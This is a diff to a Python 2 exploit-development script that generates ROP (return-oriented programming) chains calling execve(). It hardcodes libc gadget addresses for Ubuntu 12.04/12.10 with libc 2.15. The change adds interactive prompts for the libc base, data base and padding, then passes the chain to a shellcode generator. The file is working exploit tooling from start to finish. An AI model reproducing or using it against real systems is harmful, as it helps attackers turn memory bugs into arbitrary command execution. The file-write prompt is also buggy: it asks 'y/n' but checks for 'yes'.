@@ -1,6 +1,8 @@
 import re
 import sys
 
+from rop_shellcode import GenerateROPShellcode
+
 """
 This program is to create ROP code for the execve() system call to place in rop_codes.json
 """
@@ -85,7 +87,7 @@ def gui_execve(path):
         rop_code = ''.join(commands) + rop_code
         offset = offset - 4
 
-    print rop_code
+    return rop_code
 
 def main():
 
@@ -102,7 +104,7 @@ def main():
     global add_eax_b
     global call_gs_10
 
-    if len(sys.argv) == 4 and sys.argv[3] == 'ubuntu12.04-libc2.15':
+    if sys.argv[len(sys.argv) - 1] == 'ubuntu12.04-libc2.15':
         pop_ecx_pop_eax = 'ROP command: 0xf2d21L: pop ecx ; pop eax ;;\\n'
         mov_eax_ecx = 'ROP command: 0x2d71fL: mov [eax] ecx ;;\\n'
         xor_eax_eax = 'ROP command: 0x341a5L: xor eax eax ;;\\n'
@@ -112,7 +114,7 @@ def main():
         add_eax_b = 'ROP command: 0x148428L: add eax 0xb ;;\\n'
         call_gs_10 = 'ROP command: 0xb8dc5L: call dword [gs:0x10]'
 
-    elif len(sys.argv) == 4 and sys.argv[3] == 'ubuntu12.10-libc2.15':
+    elif sys.argv[len(sys.argv) - 1] == 'ubuntu12.10-libc2.15':
         pop_ecx_pop_eax = 'ROP command: 0xf2c81L: pop ecx ; pop eax ;;\\n'
         mov_eax_ecx = 'ROP command: 0x2d71fL: mov [eax] ecx ;;\\n'
         xor_eax_eax = 'ROP command: 0x32eb0L: xor eax eax ;;\\n'
@@ -133,7 +135,20 @@ def main():
         call_gs_10 = 'ROP command: 0xbaa75L: call dword [gs:0x10]'
 
     if int(sys.argv[2]) == 1:
-    	gui_execve(sys.argv[1])
+        rop_code = gui_execve(sys.argv[1])
+        if len(sys.argv) > 3 and sys.argv[3] == 'print':
+            print rop_code
+            sys.exit(0)
+    else:
+        sys.exit(0)
+
+    generator = GenerateROPShellcode(padding=0, _id=0, json_file=None)
+    generator.code = rop_code.replace('\\n', '\n')
+    generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
+    generator.data_base = hex(int(str(raw_input('Enter the data base (format - 0xdeadbeef): ')).replace('L', ''), 16))
+    generator.padding = int(raw_input('Padding: '))
+    generator.print_code = str(raw_input('Would you like to write the code into a file (y/n)? ')) == 'yes'
+    generator.construct_shellcode()
 
 if __name__ == '__main__':
     main()
